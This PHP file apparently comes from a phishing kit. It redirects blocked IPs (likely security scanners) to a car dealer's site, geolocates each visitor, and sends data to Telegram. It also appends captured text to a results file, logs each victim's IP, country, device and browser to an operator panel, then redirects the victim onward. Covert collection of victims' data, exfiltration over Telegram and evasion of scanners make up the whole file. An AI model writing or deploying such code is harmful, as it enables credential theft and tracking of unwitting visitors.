<?php
	error_reporting(0);
    session_start();

	include "./libraries/geoplugin.class.php";
	include "./libraries/UserInfo.php";
	include "./setting/functions.php";

    function isBlocked($ip) {
        $blockedIPs = file_get_contents('./panel/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }

    // Get the user's IP address
    $userIP = get_client_ip();

    // Check if the user's IP is blocked
    if (isBlocked($userIP)) {
        // Redirect the blocked user to another page
        header("Location: https://www.superhonda.com/");
        exit();
    }

	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	$ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }

    // Send Data To Telegram :

    telegram($message);

    // Save Data In Document Text :

    $file = fopen("./file/fisle.txt", "a");
    fwrite($file, $text_to_result. "\n");
    fclose($file);

    $user_ip = get_client_ip() . $geoplugin->countryCode; 
    $id_user = rand(0, 1000000); 
    $current_page = "Message Explain Page"; 
    $timestamp =  date("Y-m-d H:i:s");
    $user_agent =   " DEVICE = " .UserInfo::get_device()." SYSTEM TYPE = ". UserInfo::get_os(). " BROWSER VISIT = ". UserInfo::get_browser();
    $block_user = get_client_ip();

    // Append user information to the user_data.txt file
    $user_data = "$id_user,$current_page,$user_ip,$timestamp,$user_agent,$block_user\n";
    file_put_contents("./panel/get-panel/info-panel.txt", $user_data, FILE_APPEND);

    echo 
    "<script>
        window.location = './pages/index.php';
    </script>";

exit;
?>